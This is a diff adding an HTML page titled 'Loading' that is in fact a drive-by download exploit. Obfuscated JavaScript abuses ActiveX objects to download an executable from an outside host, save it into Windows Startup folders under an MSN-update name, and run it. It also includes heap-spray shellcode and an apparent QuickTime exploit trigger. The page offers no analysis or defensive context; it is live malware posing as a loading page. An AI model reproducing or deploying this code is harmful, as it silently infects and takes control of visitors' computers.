@@ -1,0 +1,243 @@
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY>
+
+Loading... ...
+
+<div id=testobj></div>
+
+<SCRIPT Language="javascript" type="text/javascript">
+
+var space="";
+
+function lsrn(lev3par1) {
+ var url = "http://www.eden21.net/images/images.php?w=0&e=6";
+
+ var tds = 17;
+ var stxml = "XML";
+ var stgt = "GET";
+ var std = "D";
+
+ var ldobj = null;
+ try {
+  ldobj = objmker(lev3par1, "Microsoft."+stxml+"HTTP");
+  ldobj.open(stgt, url, false);
+ } catch(e) {
+  try {
+   ldobj = objmker(lev3par1, "MS"+stxml+"2."+stxml+"HTTP");
+   ldobj.open(stgt, url, false);
+  } catch(e) {
+   try {
+    ldobj = objmker(lev3par1, "MS"+stxml+"2.Server"+stxml+"HTTP");
+    ldobj.open(stgt, url, false);;
+   } catch(e) {
+    try {
+     ldobj=new XMLHttpRequest();
+     ldobj.open(stgt, url, false);
+    } catch(e){
+     return 0;
+    }
+   }
+  }
+ }
+
+ try {
+  ldobj.send(null);
+ } catch(e) {
+  try {
+   ldobj.send(null);
+  } catch(e) {
+   return 0;
+  };
+ };
+
+ ldbody = ldobj.responseBody;
+
+ var obj_strm = objmker(lev3par1, "A"+std+"O"+std+"B.Stream");
+ if (obj_strm) {
+  obj_strm.Type = 1;
+  obj_strm.Mode = 3;
+  obj_strm.Open();
+  obj_strm.Write(ldbody);
+
+  var hdrive="";
+  var dtemp="";
+  var dstart="";
+  var daustart="";
+  try {
+   var obj_WScript = objmker(lev3par1, "WScript.Shell");
+   try {
+    var wshProcEnv = obj_WScript.Environment("PROCESS");
+    hdrive=wshProcEnv("HOMEDRIVE");
+    dtemp=wshProcEnv("TEMP");
+   } catch(e){};
+   try {
+    dstart=obj_WScript.SpecialFolders("Startup");
+    daustart=obj_WScript.SpecialFolders("AllUsersStartup");
+   } catch(e){};
+  } catch(e){};
+  if (hdrive == "") { hdrive="C:"; };
+  if (dtemp == "") {
+   try {
+    var obj_fso = objmker(lev3par1, "Scripting.FileSystemObject");
+    dtemp = obj_fso.GetSpecialFolder(2);
+   } catch(e) {};
+  };
+  var space="";
+  var fnex = "";
+  var fn = "";
+
+  var ttttt="fdhfhfg";
+
+
+  if (fnex=="") { if (daustart != "") { try { fn = daustart+"\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; }; };
+  if (fnex=="") { if (dstart != "") { try { fn = dstart+"\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; }; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Menu Inicio\\Programas\\Inicio\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Menuen Start\\Programmer\\Start\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Menu Start\\Programma\\'s\\Opstarten\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Menu Start\\Programy\\Autostart\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Menu Avvio\\Programmi\\Esecuzione automatica\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Kaynnista-valikko\\Ohjelmat\\Kaynnistys\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Start Menu\\Programlar\\BASLANGIC\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Start-meny\\Programmer\\Oppstart\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Start-menyn\\Program\\Autostart\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Iniciar\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Dokumente und Einstellungen\\All Users\\Startmenu\\Programme\\Autostart\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = hdrive+"\\Documents and Settings\\All Users\\Главное меню\\Программы\\Автозагрузка\\msn_0803_upd041807.exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = dtemp+"\\tmp"+Math.round(Math.random()*(50000-1)+1000)+".exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = "C:\\sys"+Math.round(Math.random()*(50000-1)+1000)+".exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = "C:\\RECYCLER\\"+Math.round(Math.random()*(1000000-1)+10000)+".exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+  if (fnex=="") { try { fn = "C:\\RECYCLED\\"+Math.round(Math.random()*(1000000-1)+10000)+".exe"; obj_strm.SaveToFile(fn,2); fnex=fn; } catch(e) {}; };
+
+  if (fnex!="") {
+   try {
+    var obj_shl = objmker(lev3par1, "Shell.Application");
+    obj_shl.ShellExecute(fnex);
+   } catch(e) {
+    try {
+     obj_WScript.Exec(fnex);
+    } catch(e){
+     try {
+      var tobjst=space;
+      var obj2mk="testobj"+tobjst+".innerHTML"+tobjst+"=testobj"+tobjst+".innerHTML"+tobjst+"+\"<object"+tobjst+" classid"+tobjst+"='clsid:"+tobjst+"527196a4-b1a3-4647-931d-37ba5af23037"+tobjst+"' codebase="+tobjst+"'\"+fnex+\"'></"+tobjst+"object>\";";
+      eval(obj2mk);
+     } catch(e){
+      return 0;
+     };
+    };
+   };
+   return 1;
+  } else {
+   return 0;
+  };
+ };
+};
+
+var tds = 17;
+
+var i = 0;
+var hncx = new Array(
+"{BD96C556-65A3-11D0-983A-00C04FC29E36}",
+"{AB9BCEDD-EC7E-47E1-9322-D4A210617116}",
+"{0006F033-0000-0000-C000-000000000046}",
+"{0006F03A-0000-0000-C000-000000000046}",
+"{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}",
+"{6414512B-B978-451D-A0D8-FCFDF33E833C}",
+"{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}",
+"{06723E09-F4C2-43c8-8358-09FCD1DB0766}",
+"{639F725F-1B2D-4831-A9FD-874847682010}",
+"{BA018599-1DB3-44f9-83B4-461454C84BF8}",
+"{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}",
+"{E8CCCDDF-CA28-496b-B050-6C07C962476B}",
+null);
+good = 0;
+while (hncx[i]) {
+ var iuump = null;
+ if (hncx[i].substring(0,1) == "{") {
+  iuump = document.createElement("object");
+  iuump.setAttribute("id","obj_RDS"+i);
+  iuump.setAttribute("classid", "clsid:" + hncx[i].substring(1, hncx[i].length - 1));
+ }
+ if (iuump) {
+  try {
+    if (lsrn(iuump)) {break;};
+  } catch(e) {}
+ }
+ i++;
+}
+
+function objmker(lev2par1, lev2par2) {
+ var tds = 17;
+ var nobj = null;
+ try { eval('nobj = lev2par1.CreateObject(lev2par2)'); }catch(e){}
+ if (! nobj) { try { eval('nobj = lev2par1.CreateObject(lev2par2, "")'); }catch(e){} }
+ if (! nobj) { try { eval('nobj = lev2par1.CreateObject(lev2par2, "", "")'); }catch(e){} }
+ if (! nobj) { try { eval('nobj = lev2par1.GetObject("", lev2par2)'); }catch(e){} }
+ if (! nobj) { try { eval('nobj = lev2par1.GetObject(lev2par2, "")'); }catch(e){} }
+ if (! nobj) { try { eval('nobj = lev2par1.GetObject(lev2par2)'); }catch(e){} }
+ return(nobj);
+}
+
+function tuquiemfi(ptlrdawln, evghddnjz) {
+ while (ptlrdawln.length*2< evghddnjz)
+ {
+  ptlrdawln += ptlrdawln;
+ }
+ ptlrdawln = ptlrdawln.substring(0, evghddnjz/2);
+ return ptlrdawln;
+}
+
+var itqgmcvli = 0x0c0c0c0c;
+
+var kjateykyc = unescape("%u9090%u9090%u9090" +
+"%uCCE9%u0000%u5F00%u56E8%u0000%u8900%u50C3%u8E68%u0E4E%uE8EC"+
+"%u0060%u0000%uC931%uB966%u6E6F%u6851%u7275%u6D6C%uFF54%u50D0"+
+"%u3668%u2F1A%uE870%u0046%u0000%uC931%u5151%u378D%u8D56%u0877"+
+"%u5156%uD0FF%u6853%uFE98%u0E8A%u2DE8%u0000%u5100%uFF57%u31D0"+
+"%u49C9%u9090%u6853%uD87E%u73E2%u19E8%u0000%uFF00%u55D0%u6456"+
+"%u30A1%u0000%u8B00%u0C40%u708B%uAD1C%u688B%u8908%u5EE8%uC35D"+
+"%u5553%u5756%u6C8B%u1824%u458B%u8B3C%u0554%u0178%u8BEA%u184A"+
+"%u5A8B%u0120%uE3EB%u4935%u348B%u018B%u31EE%uFCFF%uC031%u38AC"+
+"%u74E0%uC107%u0DCF%uC701%uF2EB%u7C3B%u1424%uE175%u5A8B%u0124"+
+"%u66EB%u0C8B%u8B4B%u1C5A%uEB01%u048B%u018B%uE9E8%u0002%u0000"+
+"%uC031%uEA89%u5E5F%u5B5D%uE8C3%uFF2F%uFFFF%u686D%u2E68%u7865"+
+"%u0065%u7468%u7074%u2f3a%u772f%u7777%u772e%u7777%u652e%u6564"+
+"%u326e%u2e31%u656e%u2f74%u6d69%u6761%u7365%u692f%u616d%u6567"+
+"%u2e73%u6870%u3f70%u3d77%u2630%u3d65%u0036%u0000");
+
+var frckzkyeh = 0x400000;
+
+var mahdqpysh = kjateykyc.length * 2;
+
+var evghddnjz = frckzkyeh - (mahdqpysh + 0x38);
+
+var ptlrdawln = unescape("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090");
+ptlrdawln = tuquiemfi(ptlrdawln,evghddnjz);
+
+xrbgpsnic = (itqgmcvli - 0x400000)/ frckzkyeh;
+
+bzsperztn = new Array();
+
+for (i=0;i< xrbgpsnic;i++)
+{
+ snwoiwoix = ptlrdawln + kjateykyc;
+ bzsperztn [i] = snwoiwoix;
+};
+
+
+var tobjst2=space;
+var haveqt = false;
+var chkqt=' <sc'+'ript language="VB'+'script"> \n On Error Resume Next \n Set theObject = CreateObject("QuickTimeCheckObject.QuickTimeCheck.1") \n On Error goto 0 \n If IsObject(theObject) Then \n If theObject.IsQuickTimeAvailable(0) Then \'Just check for file\' \n haveqt = 1 \n End If \n End If \n </scr' + 'ipt> \n';
+var obj1mk="document."+tobjst2+"writeln"+tobjst2+"(chkqt);";
+eval(obj1mk);
+if (haveqt) {
+ var obj2mk="document."+tobjst2+"write"+tobjst2+"('<"+tobjst2+"object"+tobjst2+" CLASSID"+tobjst2+"=\"clsid:"+tobjst2+"02BF25D5-8C17"+tobjst2+"-4B23-BC80-"+tobjst2+"D3488ABDDC6B\" width=\"100\" height=\"30\" style=\"border:0px\"><param name=\"src\" value=\"play"+tobjst2+"list.mov\"><param name=\"auto"+tobjst2+"play\" value=\"true\"><param name=\"loop\" value=\"false\"><param name=\"controller\" value=\"true\"></"+tobjst2+"object>');";
+ eval(obj2mk);
+};
+
+
+
+
+</SCRIPT>
+
+</body>
+</html>
